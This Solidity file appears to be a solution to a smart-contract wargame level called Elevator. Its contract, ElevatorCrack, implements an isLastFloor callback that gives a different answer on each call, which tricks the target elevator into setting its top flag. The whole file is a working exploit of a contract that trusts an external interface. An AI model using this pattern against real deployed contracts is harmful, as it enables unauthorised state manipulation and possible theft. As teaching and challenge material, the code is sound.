// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator{
    function top() external view returns(bool);
    function floor() external view returns(uint);
    function goTo(uint _floor) external;
}

contract ElevatorCrack is Building{

    bool _lastFloor = false;
    IElevator elevator;
    constructor(IElevator _elevator) public {
        elevator = _elevator;
    }
    function isLastFloor(uint _floor) external override returns(bool){
        bool _lastVal = _lastFloor;
        if(!_lastFloor)_lastFloor = true;
        return _lastVal;
    }

    function crack() external{
        elevator.goTo(3);

        // Check success?
        require(elevator.top());
        require(elevator.floor() == 3);
    }
}
